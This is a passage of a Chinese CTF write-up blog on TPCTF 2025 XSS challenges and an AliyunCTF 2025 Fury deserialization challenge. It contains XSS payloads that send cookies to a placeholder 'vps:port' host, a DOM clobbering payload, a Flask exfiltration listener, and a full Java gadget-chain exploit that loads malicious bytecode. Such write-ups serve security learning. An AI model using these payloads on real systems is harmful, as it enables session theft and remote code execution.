href="https://mp.weixin.qq.com/s?__biz=MzkzMzYxNjI5Mw==&mid=2247484898&idx=1&sn=dc43b70afd69797c9e38064cf885aca8&chksm=c38c579bc6a06095bcf013f14ab0283825e8697521db2ccb994146d2c8734fc8b42a70fafc73&mpshare=1&scene=23&srcid=0311SjwfgvA26hSXXa38Dg7s&sharer_shareinfo=39bc415b40460825aa4be31f9fa60d83&sharer_shareinfo_first=39bc415b40460825aa4be31f9fa60d83#rd">TPCTF 2025 Writeup by 0xFFF</a></p><h2 id="layout三件套"><a href="#layout三件套" class="headerlink" title="layout三件套"></a>layout三件套</h2><p>原题打法。</p><p>请看VCR：</p><p><a href="https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations">Exploring the DOMPurify library: Hunting for Misconfigurations (2&#x2F;2) | mizu.re</a></p><p><a href="https://github.com/Sudistark/CTF-Writeups/blob/main/Flatt-Security-XSS-Challenge/solutions.md">https://github.com/Sudistark/CTF-Writeups/blob/main/Flatt-Security-XSS-Challenge/solutions.md</a></p><h3 id="baby-layout"><a href="#baby-layout" class="headerlink" title="baby layout"></a>baby layout</h3><p>源码很简单，XSS读到admin的cookie就是flag。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">layout</span>:   <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&#123;&#123;content&#125;&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span>  <br><span class="hljs-attr">content</span>:  test<span class="hljs-string">&quot; onload=location.href=&quot;</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//vps:port?flag=&quot;+document.cookie src=&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312175306344.png" alt="image-20250312175306344"></p><h3 id="safe-layout"><a href="#safe-layout" class="headerlink" title="safe layout"></a>safe layout</h3><p>在原来的基础上过滤了所有html属性。加了个</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">ALLOWED_ATTR</span>: []<br></code></pre></td></tr></table></figure><p>data-* 和 aria-* 类的属性不会被过滤，按照文章改改就行：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">layout</span>:   <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">data-type</span>=<span class="hljs-string">&quot;&#123;&#123;content&#125;&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span><br><span class="hljs-attr">content</span>:  test<span class="hljs-string">&quot; onload=location.href=&quot;</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//vps:port?flag=&quot;+document.cookie src=&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312175631770.png" alt="image-20250312175631770"></p><h3 id="safe-layout-revenge"><a href="#safe-layout-revenge" class="headerlink" title="safe layout revenge"></a>safe layout revenge</h3><p>除了对attr进行过滤，aria和data一并被过滤：</p><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312175818038.png" alt="image-20250312175818038"></p><p>可以采用style绕过，把xss的payload构造好后把script标签插入content：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">layout</span>: x&lt;style&gt;&lt;&#123;&#123;content&#125;&#125;/style&gt;&lt;&#123;&#123;content&#125;&#125;img src=x onerror=<span class="hljs-title function_">alert</span>()&gt;&lt;/style&gt;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">x&lt;style&gt;&lt;&#123;&#123;content&#125;&#125;/style&gt;&lt;&#123;&#123;content&#125;&#125;img src=x onerror=<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://vps:port?flag=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)&gt;&lt;/style&gt;<br></code></pre></td></tr></table></figure><p>提交内容为空即可：</p><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250313004157671.png" alt="image-20250313004157671"></p><p>官方：</p><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250313004231645.png" alt="image-20250313004231645"></p><h2 id="Are-you-incognito"><a href="#Are-you-incognito" class="headerlink" title="Are you incognito?"></a>Are you incognito?</h2><p>好像是ustc发现的0day？</p><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312182551861.png" alt="image-20250312182551861"></p><p>做法来自<a href="https://mp.weixin.qq.com/s/3N_0_rL38i5bg7iRjSd9qA">TPCTF2025 writeup by Mini-Venom</a>：</p><p>如果不存在<code>broswer.runtime.id</code>，则<code>module.exports</code>导出<code>window</code>的<code>browser</code>。</p><p>注意到<code>globalThis</code>是<code>window</code>，因此可以使用<code>dom clobberate</code>污染<code>browser.runtime.id</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (!(globalThis.<span class="hljs-property">browser</span> &amp;&amp; globalThis.<span class="hljs-property">browser</span>.<span class="hljs-property">runtime</span> &amp;&amp; globalThis.<span class="hljs-property">browser</span>.<span class="hljs-property">runtime</span>.<span class="hljs-property">id</span>)) &#123;<br><span class="hljs-comment">//...</span><br>&#125;<span class="hljs-keyword">else</span> &#123;<br>   <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = globalThis.<span class="hljs-property">browser</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p>使用iframe三层污染：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;iframe name=<span class="hljs-string">&quot;browser&quot;</span> srcdoc=<span class="hljs-string">&#x27;</span><br><span class="hljs-string">   &lt;form id=&quot;runtime&quot;&gt;&lt;/form&gt;</span><br><span class="hljs-string">   &lt;form id=&quot;runtime&quot; name=&quot;id&quot;&gt;</span><br><span class="hljs-string">   &lt;/form&gt;</span><br><span class="hljs-string"> &lt;form id=&quot;extension&quot;&gt;&lt;/form&gt;</span><br><span class="hljs-string">   &lt;form id=&quot;extension&quot; name=&quot;inIncognitoContext&quot;&gt;</span><br><span class="hljs-string">   &lt;/form&gt;&#x27;</span>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">try</span>:<br>        file_path = os.path.join(os.path.dirname(__file__), <span class="hljs-string">&#x27;index.html&#x27;</span>)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            data = f.read()<br>        <span class="hljs-keyword">return</span> data, <span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html&#x27;</span>&#125;<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Internal Server Error&#x27;</span>, <span class="hljs-number">500</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-comment"># 处 理  POST 请 求</span><br>    body = request.data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    response = &#123;<br>        <span class="hljs-string">&#x27;status&#x27;</span>: <span class="hljs-string">&#x27;flag&#x27;</span>,<br>        <span class="hljs-string">&#x27;data&#x27;</span>: body<br>    &#125;<br>    <span class="hljs-built_in">print</span>(response)<br>    <span class="hljs-keyword">return</span> jsonify(response), <span class="hljs-number">200</span><br><br><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">page_not_found</span>(<span class="hljs-params">e</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Not Found&#x27;</span>, <span class="hljs-number">404</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">21000</span>)<br></code></pre></td></tr></table></figure><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312184013283.png" alt="image-20250312184013283"></p>]]></content>
    
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AliyunCTF2025-JTools分析</title>
    <link href="/2025/03/01/AliyunCTF2025-JTools%E5%88%86%E6%9E%90/"/>
    <url>/2025/03/01/AliyunCTF2025-JTools%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这道题EXP不难理解，fury反序列化让我想起一位故人：</p><p>去年国赛华北分区赛的一道fury题，当我复现完Aliyun这道题马上就想到了华北那道，但是两个fury的黑名单其实是一样的，只是Aliyun的加了一个com.feilong，也是这道题的突破口，华北那道有点显得无懈可击了。。。</p><p>那道题是0解7修，应该是石沉大海了。期望有缘的大佬能将那道题解出来让我学习学习吧（</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>官方EXP其实写的很清楚了，打开就一个很显然的fury反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Server</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        HttpUtil.createServer(<span class="hljs-number">8888</span>).addAction(<span class="hljs-string">&quot;/&quot;</span>, (request, response) -&gt; &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> request.getParam(<span class="hljs-string">&quot;data&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-keyword">if</span> (data == <span class="hljs-literal">null</span>) &#123;<br>                response.write(IOReaderUtil.readToString(<span class="hljs-string">&quot;/tmp/desc.txt&quot;</span>), ContentType.TEXT_PLAIN.toString());<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Fury</span> <span class="hljs-variable">fury</span> <span class="hljs-operator">=</span> Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(<span class="hljs-literal">false</span>).build();<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">deserialize</span> <span class="hljs-operator">=</span> fury.deserialize(Base64.getDecoder().decode(data));<br>                result = deserialize.toString();<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                result = e.getMessage();<br>            &#125;<br><br>            response.write(result, ContentType.TEXT_PLAIN.toString());<br>        &#125;).start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对比官方的fury黑名单，发现末尾有一个新的com.feilong：</p><p><img src="/2025/03/01/AliyunCTF2025-JTools%E5%88%86%E6%9E%90/image-20250301194839339.png" alt="image-20250301194839339"></p><p>接下来就需要找链子挖掘了，这个com.feilong相当于是hint了吧。</p><p>审计可发现，<code>com.feilong.core.util.comparator.PropertyComparator</code>的compare方法可以触发getter调用：</p><p><img src="/2025/03/01/AliyunCTF2025-JTools%E5%88%86%E6%9E%90/image-20250301195347826.png" alt="image-20250301195347826"></p><p><img src="/2025/03/01/AliyunCTF2025-JTools%E5%88%86%E6%9E%90/image-20250301195633082.png" alt="image-20250301195633082"></p><p>但是我没有太懂整个完全的链，写wp的也是把难题留给了做题人，草草了事了。</p><p><img src="/2025/03/01/AliyunCTF2025-JTools%E5%88%86%E6%9E%90/image-20250301200331433.png" alt="image-20250301200331433"></p><p><img src="/2025/03/01/AliyunCTF2025-JTools%E5%88%86%E6%9E%90/image-20250301200340270.png" alt="image-20250301200340270"></p><p>source&amp;sink直接用CC链里的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">PriorityQueue.readObject()<br>PropertyComparator.compare()<br>TemplatesImpl.getOutputProperties()<br>...加载自定义字节码<br></code></pre></td></tr></table></figure><p>然后利用动态代理触发<code>MapProxy</code>的invoke，到达<code>BeanConverter</code>的jdk二次反序列化点绕过黑名单。</p><p>这个思路我确实闻所未闻，网上也没有相关的记载。做出这道题的也好像只有三四个队。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> exp.eddiemurphy;<br><br><span class="hljs-keyword">import</span> cn.hutool.core.map.MapProxy;<br><span class="hljs-keyword">import</span> cn.hutool.core.util.ReflectUtil;<br><span class="hljs-keyword">import</span> cn.hutool.core.util.SerializeUtil;<br><span class="hljs-keyword">import</span> com.feilong.core.util.comparator.PropertyComparator;<br><span class="hljs-keyword">import</span> com.feilong.lib.digester3.ObjectCreationFactory;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.fury.Fury;<br><span class="hljs-keyword">import</span> org.apache.fury.config.Language;<br><br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">///templates</span><br><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Exp.class.getResourceAsStream(<span class="hljs-string">&quot;Evil.class&quot;</span>);<br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[inputStream.available()];<br>        inputStream.read(bytes);<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">tmpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(tmpl, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(tmpl, <span class="hljs-string">&quot;hello&quot;</span>);<br><br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">tmpl1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes1</span> <span class="hljs-operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes1.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes1.set(tmpl1, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name1.setAccessible(<span class="hljs-literal">true</span>);<br>        name1.set(tmpl1, <span class="hljs-string">&quot;hello2&quot;</span>);<br>        <span class="hljs-comment">///templates</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;digester&quot;</span>;<br>        <span class="hljs-type">PropertyComparator</span> <span class="hljs-variable">propertyComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PropertyComparator</span>(prop);<br>        <span class="hljs-type">Fury</span> <span class="hljs-variable">fury</span> <span class="hljs-operator">=</span> Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(<span class="hljs-literal">false</span>).build();<br>        <span class="hljs-comment">////jdk</span><br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">templatesImpl1</span> <span class="hljs-operator">=</span> tmpl1;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> tmpl;<br><br>        <span class="hljs-type">PropertyComparator</span> <span class="hljs-variable">propertyComparator1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PropertyComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, propertyComparator1);<br>        ReflectUtil.setFieldValue(priorityQueue1, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>);<br>        Object[] objectsjdk = &#123;templatesImpl1, templatesImpl&#125;;<br>        setFieldValue(priorityQueue1, <span class="hljs-string">&quot;queue&quot;</span>, objectsjdk);<br>        <span class="hljs-comment">/////jdk</span><br><br>        <span class="hljs-type">byte</span>[] data = SerializeUtil.serialize(priorityQueue1);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">hashmap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashmap.put(prop, data);<br><br>        <span class="hljs-type">MapProxy</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MapProxy</span>(hashmap);<br>        <span class="hljs-type">ObjectCreationFactory</span>  <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> (ObjectCreationFactory) Proxy.newProxyInstance(ObjectCreationFactory.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;ObjectCreationFactory.class&#125;, mapProxy);<br>        <span class="hljs-type">ObjectCreationFactory</span>  <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> (ObjectCreationFactory) Proxy.newProxyInstance(ObjectCreationFactory.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;ObjectCreationFactory.class&#125;, mapProxy);<br><br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, propertyComparator);<br>        ReflectUtil.setFieldValue(priorityQueue, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>);<br>        Object[] objects = &#123;test, test1&#125;;<br>        setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, objects);<br><br>        <span class="hljs-type">byte</span>[] serialize = fury.serialize(priorityQueue);<br>        System.out.println(Base64.getEncoder().encodeToString(serialize));<br><br>        <span class="hljs-comment">//Object deserialize = fury.deserialize(serialize);</span><br>        <span class="hljs-comment">//String result = deserialize.toString();</span><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其实看完整的EXP还是比较有逻辑的，两次反序列化把恶意字节码的杀招藏到了赋有<code>outputProperties</code>的<code>priorityQueue</code>，序列化之后再套了一个fury序列化来使得最初的黑名单检测失效，只不过<code>digester</code>的寻找确实需要一定的时间和调试了。</p><p><img src="/2025/03/01/AliyunCTF2025-JTools%E5%88%86%E6%9E%90/image-20250301200949465.png" alt="image-20250301200949465"></p><p>题目是不出网的，这里由于没spring啥的依赖所以打内存马有点困难，但是题目贴心的给了一个读取<code>/tmp/desc.txt</code>的文件，那么直接覆盖读文件就可以了：</p><p><img src="/2025/03/01/AliyunCTF2025-JTools%E5%88%86%E6%9E%90/image-20250301201205535.png" alt="image-20250301201205535"></p><p>调用栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java">getOutputProperties:<span class="hljs-number">506</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br>invokeMethod:<span class="hljs-number">1922</span>, PropertyUtilsBean (com.feilong.lib.beanutils) [<span class="hljs-number">2</span>]<br>getSimpleProperty:<span class="hljs-number">1095</span>, PropertyUtilsBean (com.feilong.lib.beanutils)<br>getSimpleProperty:<span class="hljs-number">1079</span>, PropertyUtilsBean (com.feilong.lib.beanutils)<br>getProperty:<span class="hljs-number">825</span>, PropertyUtilsBean (com.feilong.lib.beanutils)<br>getProperty:<span class="hljs-number">162</span>, PropertyUtils (com.feilong.lib.beanutils)<br>getDataUseApache:<span class="hljs-number">89</span>, PropertyValueObtainer (com.feilong.core.bean)<br>obtain:<span class="hljs-number">70</span>, PropertyValueObtainer (com.feilong.core.bean)<br>getProperty:<span class="hljs-number">577</span>, PropertyUtil (com.feilong.core.bean)<br>compare:<span class="hljs-number">430</span>, PropertyComparator (com.feilong.core.util.comparator)<br>siftDownUsingComparator:<span class="hljs-number">721</span>, PriorityQueue (java.util)<br>siftDown:<span class="hljs-number">687</span>, PriorityQueue (java.util)<br>heapify:<span class="hljs-number">736</span>, PriorityQueue (java.util)<br>readObject:<span class="hljs-number">796</span>, PriorityQueue (java.util)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method 